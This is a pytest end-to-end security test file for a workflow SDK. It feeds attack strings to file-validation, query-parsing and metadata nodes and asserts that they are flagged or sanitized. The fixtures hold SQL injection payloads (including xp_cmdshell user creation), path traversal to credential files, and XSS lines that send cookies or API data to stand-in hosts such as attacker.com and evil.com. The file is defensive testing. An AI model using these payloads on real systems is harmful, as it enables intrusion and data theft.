"""
Security Complete Workflow End-to-End Tests - Phase 2 Remediation
================================================================

Tier 3 (E2E) tests for complete security workflow scenarios.
Tests full security compliance with real infrastructure and user scenarios.

Test Categories:
- Complete security workflow scenarios
- Real attack simulation and prevention
- Production-like security validation
- Business process security compliance
- End-to-end vulnerability testing

All tests use real infrastructure - NO MOCKING.
Tests represent actual user workflows and attack scenarios.
"""

import pytest
import time
import uuid
import json
import tempfile
import subprocess
from pathlib import Path
from typing import Dict, Any, List
from datetime import datetime, timedelta

# Security testing imports
import requests
import sqlite3
import psycopg2
import redis

# Kailash SDK imports
from kailash.workflow.builder import WorkflowBuilder
from kailash.runtime.local import LocalRuntime

# Import test utilities
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.docker_config import DockerTestConfig
from utils.service_monitor import ServiceMonitor

# Import security nodes from integration tests
from tests.integration.test_security_workflow_integration import (
    FileValidationNode,
    FileStorageNode,
    QueryParseNode,
    StatusUpdateNode
)


class SecurityTestScenarios:
    """Complete security test scenarios for E2E testing"""
    
    @staticmethod
    def create_document_processing_attack_scenario():
        """Create a document processing workflow with attack vectors"""
        # Simulated malicious document upload scenario
        malicious_files = [
            "invoice.pdf'; DROP TABLE documents; --",
            "../../../etc/passwd",
            "report.docx<script>fetch('/api/admin/delete')</script>",
            "C:\\Windows\\System32\\config\\SAM",
            "presentation.pptx'; UNION SELECT password FROM users; --"
        ]
        
        # Malicious metadata
        malicious_metadata = {
            "author": "<script>window.location='http://attacker.com/steal?data='+document.cookie</script>",
            "description": "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
            "tags": ["business'; DELETE FROM tags; --", "../../config/secrets.yaml"],
            "department": "IT<iframe src='javascript:alert(\"XSS\")'></iframe>"
        }
        
        return {
            "files": malicious_files,
            "metadata": malicious_metadata,
            "processing_options": {
                "scan_content": True,
                "extract_text": True,
                "generate_thumbnails": True
            }
        }
    
    @staticmethod
    def create_search_attack_scenario():
        """Create search workflow with injection attacks"""
        # Various search attack vectors
        search_attacks = [
            "products'; DROP TABLE products; SELECT * FROM credit_cards WHERE '1'='1",
            "<script>fetch('/api/users').then(r=>r.json()).then(d=>fetch('http://attacker.com',{method:'POST',body:JSON.stringify(d)}))</script>",
            "'; EXEC xp_cmdshell('net user attacker password123 /add'); --",
            "../../../etc/shadow UNION SELECT username, password FROM users",
            "normal search term'; UPDATE users SET password='hacked' WHERE admin=1; --"
        ]
        
        return {
            "search_queries": search_attacks,
            "search_options": {
                "include_sensitive": True,
                "max_results": 1000,
                "enable_wildcards": True
            }
        }
    
    @staticmethod
    def create_user_data_attack_scenario():
        """Create user data processing with privacy attacks"""
        # Simulated PII extraction attacks
        malicious_user_data = {
            "profile_data": {
                "name": "John'; SELECT credit_card FROM payments; --",
                "email": "user@domain.com<script>location.href='http://attacker.com/'+btoa(document.cookie)</script>",
                "phone": "555-0123'; INSERT INTO logs VALUES (user(), version(), @@datadir); --",
                "address": "../../../proc/self/environ"
            },
            "preferences": {
                "theme": "'; LOAD_FILE('/etc/passwd'); --",
                "language": "<object data='javascript:alert(document.domain)'></object>",
                "notifications": "enabled'; DROP DATABASE user_data; --"
            }
        }
        
        return malicious_user_data


@pytest.fixture(scope="module")
def production_like_environment():
    """Setup production-like environment for E2E security testing"""
    config = DockerTestConfig()
    monitor = ServiceMonitor()
    
    # Ensure all services are running
    max_retries = 3
    for attempt in range(max_retries):
        try:
            # Check service status
            services_status = monitor.check_all_services()
            
            if not all(services_status.values()):
                print(f"Starting services (attempt {attempt + 1}/{max_retries})...")
                subprocess.run(
                    ["./tests/utils/test-env", "up", "--wait"],
                    cwd=Path(__file__).parent.parent,
                    check=True,
                    capture_output=True
                )
                time.sleep(15)  # Wait for services to stabilize
            
            # Verify services are ready
            services_status = monitor.check_all_services()
            if all(services_status.values()):
                break
                
        except subprocess.CalledProcessError as e:
            if attempt == max_retries - 1:
                pytest.skip(f"Failed to start production-like environment: {e}")
            time.sleep(10)
    
    # Setup test data and schemas
    setup_test_environment()
    
    yield config
    
    # Cleanup (optional - preserve for other tests)


def setup_test_environment():
    """Setup test databases and schemas for security testing"""
    # Setup PostgreSQL test schema
    try:
        conn = psycopg2.connect(
            host="localhost",
            port=5432,
            database="test_db", 
            user="test_user",
            password="test_password"
        )
        cursor = conn.cursor()
        
        # Create security test tables
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS documents (
                id SERIAL PRIMARY KEY,
                filename VARCHAR(255),
                content_hash VARCHAR(64),
                metadata JSONB,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS search_logs (
                id SERIAL PRIMARY KEY,
                query VARCHAR(1000),
                user_id VARCHAR(100),
                results_count INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS user_profiles (
                id SERIAL PRIMARY KEY,
                user_id VARCHAR(100) UNIQUE,
                profile_data JSONB,
                preferences JSONB,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        conn.commit()
        cursor.close()
        conn.close()
        
    except psycopg2.Error:
        pass  # Skip if PostgreSQL not available
    
    # Setup Redis test data
    try:
        redis_client = redis.Redis(host="localhost", port=6379, db=1)
        redis_client.ping()
        
        # Clear test database
        redis_client.flushdb()
        
        redis_client.close()
        
    except redis.RedisError:
        pass  # Skip if Redis not available


class TestCompleteSecurityWorkflows:
    """Test complete security workflows end-to-end"""
    
    def test_document_processing_security_workflow(self, production_like_environment):
        """Test complete document processing workflow with security attacks"""
        # Get malicious document scenario
        attack_scenario = SecurityTestScenarios.create_document_processing_attack_scenario()
        
        # Create comprehensive document processing workflow
        workflow = WorkflowBuilder()
        
        # Stage 1: File Validation and Security Scanning
        workflow.add_node("FileValidationNode", "initial_security_scan", {
            "files": attack_scenario["files"],
            "allowed_extensions": [".pdf", ".docx", ".pptx", ".txt"],
            "max_file_size": 50 * 1024 * 1024,  # 50MB
            "scan_content": True
        })
        
        # Stage 2: Metadata Processing and Sanitization
        workflow.add_node("StatusUpdateNode", "process_metadata", {
            "entity_id": "document_batch_" + str(uuid.uuid4())[:8],
            "status": "processing_metadata",
            "metadata": attack_scenario["metadata"],
            "persist_to_database": True
        })
        
        # Stage 3: Content Analysis and Search Indexing
        workflow.add_node("QueryParseNode", "analyze_content", {
            "query": "extract searchable content from: " + str(attack_scenario["files"][0]),
            "max_query_length": 2000,
            "enable_advanced_operators": False
        })
        
        # Stage 4: Secure Storage
        workflow.add_node("FileStorageNode", "secure_storage", {
            "file_data": attack_scenario["metadata"],
            "storage_path": "documents/secure/" + str(uuid.uuid4()),
            "encryption_enabled": True
        })
        
        # Stage 5: Final Security Validation
        workflow.add_node("StatusUpdateNode", "final_validation", {
            "entity_id": "security_validation",
            "status": "completed_security_scan",
            "metadata": {"scan_results": "comprehensive"},
            "persist_to_database": True
        })
        
        # Execute complete workflow
        start_time = time.time()
        runtime = LocalRuntime()
        results, run_id = runtime.execute(workflow.build())
        execution_time = time.time() - start_time
        
        # Verify workflow completed successfully
        assert run_id is not None
        assert len(results) == 5  # All stages executed
        assert execution_time < 10.0, f"Security workflow too slow: {execution_time:.3f}s"
        
        # Verify Stage 1: Security Scan Results
        security_scan = results["initial_security_scan"]
        assert "validation_results" in security_scan
        
        # Check that malicious files were flagged
        validation_results = security_scan["validation_results"]
        sql_injection_detected = any(
            not result["is_safe"] and any("DROP TABLE" in issue for issue in result["issues"])
            for result in validation_results
        )
        path_traversal_detected = any(
            not result["is_safe"] and any("traversal" in issue.lower() for issue in result["issues"])
            for result in validation_results
        )
        
        assert sql_injection_detected, "SQL injection in filenames not detected"
        assert path_traversal_detected, "Path traversal attempts not detected"
        
        # Verify Stage 2: Metadata Security
        metadata_result = results["process_metadata"]
        assert metadata_result["security_validated"] is True
        
        # Check that XSS in metadata was sanitized
        sanitized_metadata = metadata_result["metadata"]
        assert "<script>" not in str(sanitized_metadata)
        assert "javascript:" not in str(sanitized_metadata)
        assert "INSERT INTO" not in str(sanitized_metadata)
        
        # Verify Stage 3: Content Analysis Security
        content_analysis = results["analyze_content"]
        assert content_analysis["is_safe"] is True
        assert content_analysis["security_validated"] is True
        
        # Verify Stage 4: Secure Storage
        storage_result = results["secure_storage"]
        
        # Should either reject unsafe path or create secure alternative
        if storage_result["status"] == "error":
            assert "unsafe" in storage_result.get("error", "").lower()
        else:
            assert "secure_storage/" in storage_result.get("secure_path", "")
        
        # Verify Stage 5: Final Validation
        final_validation = results["final_validation"]
        assert final_validation["security_validated"] is True
    
    def test_search_system_security_workflow(self, production_like_environment):
        """Test search system with comprehensive attack vectors"""
        attack_scenario = SecurityTestScenarios.create_search_attack_scenario()
        
        # Create multi-stage search security workflow
        workflow = WorkflowBuilder()
        
        for i, malicious_query in enumerate(attack_scenario["search_queries"]):
            # Stage 1: Query Parsing and Sanitization
            workflow.add_node("QueryParseNode", f"parse_query_{i}", {
                "query": malicious_query,
                "max_query_length": 500,
                "enable_advanced_operators": False
            })
            
            # Stage 2: Query Validation and Logging
            workflow.add_node("StatusUpdateNode", f"log_query_{i}", {
                "entity_id": f"search_session_{i}",
                "status": f"query_processed",
                "metadata": {
                    "original_query": malicious_query,
                    "search_options": attack_scenario["search_options"]
                },
                "persist_to_database": True
            })
        
        # Execute comprehensive search workflow
        start_time = time.time()
        runtime = LocalRuntime()
        results, run_id = runtime.execute(workflow.build())
        execution_time = time.time() - start_time
        
        # Verify workflow performance and completion
        assert run_id is not None
        assert len(results) == len(attack_scenario["search_queries"]) * 2
        assert execution_time < 15.0, f"Search security workflow too slow: {execution_time:.3f}s"
        
        # Verify each search query was properly secured
        for i in range(len(attack_scenario["search_queries"])):
            # Check query parsing results
            parse_result = results[f"parse_query_{i}"]
            assert parse_result["is_safe"] is True, f"Query {i} not properly sanitized"
            assert parse_result["security_validated"] is True
            
            # Verify SQL injection was removed
            sanitized_query = parse_result["sanitized_query"]
            assert "DROP TABLE" not in sanitized_query.upper()
            assert "EXEC xp_cmdshell" not in sanitized_query
            assert "UNION SELECT" not in sanitized_query.upper()
            
            # Verify XSS was removed
            assert "<script>" not in sanitized_query
            assert "javascript:" not in sanitized_query
            assert "fetch(" not in sanitized_query
            
            # Check logging results
            log_result = results[f"log_query_{i}"]
            assert log_result["security_validated"] is True
            
            # Verify metadata was sanitized
            logged_metadata = log_result["metadata"]
            assert "INSERT INTO" not in str(logged_metadata)
            assert "<script>" not in str(logged_metadata)
    
    def test_user_data_privacy_security_workflow(self, production_like_environment):
        """Test user data processing with privacy attack vectors"""
        attack_scenario = SecurityTestScenarios.create_user_data_attack_scenario()
        
        # Create user data processing workflow with privacy protection
        workflow = WorkflowBuilder()
        
        # Stage 1: Profile Data Validation
        workflow.add_node("StatusUpdateNode", "validate_profile", {
            "entity_id": "user_profile_validation",
            "status": "validating_profile_data",
            "metadata": attack_scenario["profile_data"],
            "persist_to_database": True
        })
        
        # Stage 2: Preferences Security Check
        workflow.add_node("StatusUpdateNode", "validate_preferences", {
            "entity_id": "user_preferences_validation",
            "status": "validating_preferences",
            "metadata": attack_scenario["preferences"],
            "persist_to_database": True
        })
        
        # Stage 3: Data Storage Security
        workflow.add_node("FileStorageNode", "secure_user_storage", {
            "file_data": attack_scenario,
            "storage_path": "users/profiles/secure",
            "encryption_enabled": True
        })
        
        # Stage 4: Search Index Update (with user data)
        user_search_query = f"update user index: {attack_scenario['profile_data']['name']}"
        workflow.add_node("QueryParseNode", "update_search_index", {
            "query": user_search_query,
            "max_query_length": 1000,
            "enable_advanced_operators": False
        })
        
        # Execute user data security workflow
        start_time = time.time()
        runtime = LocalRuntime()
        results, run_id = runtime.execute(workflow.build())
        execution_time = time.time() - start_time
        
        # Verify workflow completion and security
        assert run_id is not None
        assert len(results) == 4
        assert execution_time < 8.0, f"User data security workflow too slow: {execution_time:.3f}s"
        
        # Verify Stage 1: Profile Data Security
        profile_result = results["validate_profile"]
        assert profile_result["security_validated"] is True
        
        profile_metadata = profile_result["metadata"]
        
        # Check SQL injection removal from user data
        assert "SELECT credit_card" not in str(profile_metadata)
        assert "INSERT INTO logs" not in str(profile_metadata)
        
        # Check XSS removal
        assert "<script>" not in str(profile_metadata)
        assert "btoa(document.cookie)" not in str(profile_metadata)
        
        # Check path traversal removal
        assert "proc/self/environ" not in str(profile_metadata)
        
        # Verify Stage 2: Preferences Security
        preferences_result = results["validate_preferences"]
        assert preferences_result["security_validated"] is True
        
        preferences_metadata = preferences_result["metadata"]
        
        # Check security sanitization
        assert "LOAD_FILE" not in str(preferences_metadata)
        assert "DROP DATABASE" not in str(preferences_metadata)
        assert "<object data='javascript:" not in str(preferences_metadata)
        
        # Verify Stage 3: Secure Storage
        storage_result = results["secure_user_storage"]
        assert storage_result["security_validated"] is True
        assert storage_result["encryption_enabled"] is True
        
        # Verify Stage 4: Search Index Security
        search_result = results["update_search_index"]
        assert search_result["is_safe"] is True
        assert search_result["security_validated"] is True
    
    def test_complete_attack_simulation(self, production_like_environment):
        """Simulate a complete multi-vector attack against the system"""
        # Combined attack scenario
        combined_attack = {
            # File system attack
            "files": [
                "../../../etc/passwd",
                "invoice.pdf'; DELETE FROM invoices; --",
                "<script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('http://evil.com',{method:'POST',body:JSON.stringify(d)}))</script>.pdf"
            ],
            
            # Database attack
            "queries": [
                "products'; DROP TABLE products; SELECT password FROM admin_users WHERE id=1; --",
                "'; EXEC xp_cmdshell('whoami'); --"
            ],
            
            # Application attack
            "user_inputs": {
                "name": "<img src=x onerror=alert('XSS')>Admin",
                "description": "'; UPDATE users SET role='admin' WHERE id=current_user_id(); --",
                "category": "../../config/database.yml"
            }
        }
        
        # Create comprehensive security workflow
        workflow = WorkflowBuilder()
        
        # Multi-stage attack detection and prevention
        workflow.add_node("FileValidationNode", "detect_file_attacks", {
            "files": combined_attack["files"],
            "scan_content": True,
            "allowed_extensions": [".pdf", ".txt", ".doc"]
        })
        
        for i, query in enumerate(combined_attack["queries"]):
            workflow.add_node("QueryParseNode", f"detect_sql_injection_{i}", {
                "query": query,
                "enable_advanced_operators": False
            })
        
        workflow.add_node("StatusUpdateNode", "detect_app_attacks", {
            "entity_id": "security_scan",
            "status": "scanning_user_inputs",
            "metadata": combined_attack["user_inputs"],
            "persist_to_database": True
        })
        
        # Execute complete attack simulation
        start_time = time.time()
        runtime = LocalRuntime()
        results, run_id = runtime.execute(workflow.build())
        execution_time = time.time() - start_time
        
        # Verify complete attack was blocked
        assert run_id is not None
        assert len(results) == 4  # File + 2 queries + app
        assert execution_time < 12.0, f"Attack simulation too slow: {execution_time:.3f}s"
        
        # Verify file attacks were blocked
        file_results = results["detect_file_attacks"]
        validation_results = file_results["validation_results"]
        
        # All malicious files should be flagged
        unsafe_files = [r for r in validation_results if not r["is_safe"]]
        assert len(unsafe_files) >= 2, "File attacks not properly detected"
        
        # Verify SQL injection attacks were blocked
        for i in range(len(combined_attack["queries"])):
            sql_result = results[f"detect_sql_injection_{i}"]
            assert sql_result["is_safe"] is True, f"SQL injection {i} not blocked"
            
            sanitized_query = sql_result["sanitized_query"]
            assert "DROP TABLE" not in sanitized_query.upper()
            assert "EXEC xp_cmdshell" not in sanitized_query
        
        # Verify application attacks were blocked
        app_result = results["detect_app_attacks"]
        assert app_result["security_validated"] is True
        
        sanitized_metadata = app_result["metadata"]
        assert "<img src=x onerror=" not in str(sanitized_metadata)
        assert "UPDATE users SET role=" not in str(sanitized_metadata)
        assert "config/database.yml" not in str(sanitized_metadata)


class TestProductionSecurityCompliance:
    """Test security compliance in production-like scenarios"""
    
    def test_high_volume_security_processing(self, production_like_environment):
        """Test security measures under high volume load"""
        # Generate high volume of potentially malicious requests
        malicious_requests = []
        
        for i in range(50):  # 50 concurrent malicious requests
            request = {
                "files": [f"file_{i}.pdf'; DROP TABLE files_{i}; --"],
                "query": f"search_{i}'; UNION SELECT password FROM users WHERE id={i}; --",
                "metadata": {
                    "user": f"user_{i}<script>fetch('/admin/delete/{i}')</script>",
                    "action": f"process_{i}'; DELETE FROM logs WHERE id>{i}; --"
                }
            }
            malicious_requests.append(request)
        
        # Create high-volume workflow
        workflow = WorkflowBuilder()
        
        for i, request in enumerate(malicious_requests[:10]):  # Limit to 10 for E2E test
            workflow.add_node("FileValidationNode", f"validate_{i}", {
                "files": request["files"],
                "scan_content": True
            })
            
            workflow.add_node("QueryParseNode", f"parse_{i}", {
                "query": request["query"],
                "enable_advanced_operators": False
            })
            
            workflow.add_node("StatusUpdateNode", f"update_{i}", {
                "entity_id": f"batch_{i}",
                "status": "processing",
                "metadata": request["metadata"],
                "persist_to_database": False  # Skip DB for performance
            })
        
        # Execute high-volume workflow
        start_time = time.time()
        runtime = LocalRuntime()
        results, run_id = runtime.execute(workflow.build())
        execution_time = time.time() - start_time
        
        # Verify performance with security
        assert run_id is not None
        assert len(results) == 30  # 10 * 3 nodes
        assert execution_time < 20.0, f"High volume security too slow: {execution_time:.3f}s"
        
        # Verify all malicious requests were handled securely
        for i in range(10):
            # Check file validation
            file_result = results[f"validate_{i}"]
            file_validation = file_result["validation_results"][0]
            assert not file_validation["is_safe"], f"Malicious file {i} not detected"
            
            # Check query parsing
            query_result = results[f"parse_{i}"]
            assert query_result["is_safe"] is True, f"Query {i} not sanitized"
            assert "UNION SELECT" not in query_result["sanitized_query"].upper()
            
            # Check metadata processing
            update_result = results[f"update_{i}"]
            assert update_result["security_validated"] is True
            metadata = update_result["metadata"]
            assert "<script>" not in str(metadata)
            assert "DELETE FROM" not in str(metadata)
    
    def test_business_process_security_compliance(self, production_like_environment):
        """Test security in realistic business process workflows"""
        # Simulate business document processing workflow
        business_scenario = {
            "invoice_processing": {
                "files": ["invoice_001.pdf", "receipt_002.jpg"],
                "vendor": "Acme Corp'; UPDATE vendors SET approved=0; --",
                "amount": "1500.00'; INSERT INTO payments VALUES (999999, 'hacker'); --",
                "description": "<script>window.location='http://evil.com/steal'</script>Office supplies"
            },
            "contract_review": {
                "files": ["contract.docx../../etc/passwd", "terms.pdf"],
                "client": "BigCorp<iframe src='javascript:alert(document.domain)'></iframe>", 
                "status": "approved'; DROP TABLE contracts; --"
            },
            "employee_onboarding": {
                "files": ["resume.pdf", "id_scan.jpg'; DELETE FROM employees; --"],
                "employee_data": {
                    "name": "John Doe<script>fetch('/hr/salaries')</script>",
                    "ssn": "123-45-6789'; SELECT * FROM payroll; --",
                    "email": "john@company.com../../config/secrets"
                }
            }
        }
        
        workflow = WorkflowBuilder()
        
        # Invoice Processing Stage
        workflow.add_node("FileValidationNode", "validate_invoices", {
            "files": business_scenario["invoice_processing"]["files"],
            "scan_content": True
        })
        
        workflow.add_node("StatusUpdateNode", "process_invoice", {
            "entity_id": "invoice_001",
            "status": "processing_invoice",
            "metadata": {
                "vendor": business_scenario["invoice_processing"]["vendor"],
                "amount": business_scenario["invoice_processing"]["amount"],
                "description": business_scenario["invoice_processing"]["description"]
            },
            "persist_to_database": True
        })
        
        # Contract Review Stage  
        workflow.add_node("FileValidationNode", "validate_contracts", {
            "files": business_scenario["contract_review"]["files"],
            "scan_content": True
        })
        
        workflow.add_node("StatusUpdateNode", "process_contract", {
            "entity_id": "contract_001",
            "status": business_scenario["contract_review"]["status"],
            "metadata": {"client": business_scenario["contract_review"]["client"]},
            "persist_to_database": True
        })
        
        # Employee Onboarding Stage
        workflow.add_node("FileValidationNode", "validate_employee_docs", {
            "files": business_scenario["employee_onboarding"]["files"],
            "scan_content": True
        })
        
        workflow.add_node("StatusUpdateNode", "process_employee", {
            "entity_id": "employee_new",
            "status": "onboarding",
            "metadata": business_scenario["employee_onboarding"]["employee_data"],
            "persist_to_database": True
        })
        
        # Execute business process workflow
        start_time = time.time()
        runtime = LocalRuntime()
        results, run_id = runtime.execute(workflow.build())
        execution_time = time.time() - start_time
        
        # Verify business process security
        assert run_id is not None
        assert len(results) == 6
        assert execution_time < 15.0, f"Business process security too slow: {execution_time:.3f}s"
        
        # Verify invoice processing security
        invoice_validation = results["validate_invoices"]
        assert "validation_results" in invoice_validation
        
        invoice_processing = results["process_invoice"]
        assert invoice_processing["security_validated"] is True
        invoice_metadata = invoice_processing["metadata"]
        assert "UPDATE vendors" not in str(invoice_metadata)
        assert "INSERT INTO payments" not in str(invoice_metadata)
        assert "<script>" not in str(invoice_metadata)
        
        # Verify contract review security
        contract_validation = results["validate_contracts"]
        contract_results = contract_validation["validation_results"]
        
        # Path traversal in filename should be detected
        path_traversal_detected = any(
            not result["is_safe"] and any("traversal" in issue.lower() for issue in result["issues"])
            for result in contract_results
        )
        assert path_traversal_detected, "Path traversal in contract files not detected"
        
        contract_processing = results["process_contract"]
        assert contract_processing["security_validated"] is True
        assert "DROP TABLE" not in contract_processing["sanitized_status"]
        contract_metadata = contract_processing["metadata"]
        assert "<iframe" not in str(contract_metadata)
        
        # Verify employee onboarding security
        employee_validation = results["validate_employee_docs"]
        employee_results = employee_validation["validation_results"]
        
        # SQL injection in filename should be detected
        sql_injection_detected = any(
            not result["is_safe"] and any("DELETE FROM" in result["original_path"])
            for result in employee_results
        )
        assert sql_injection_detected, "SQL injection in employee files not detected"
        
        employee_processing = results["process_employee"]
        assert employee_processing["security_validated"] is True
        employee_metadata = employee_processing["metadata"]
        assert "<script>" not in str(employee_metadata)
        assert "SELECT * FROM payroll" not in str(employee_metadata)
        assert "config/secrets" not in str(employee_metadata)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "--timeout=600"])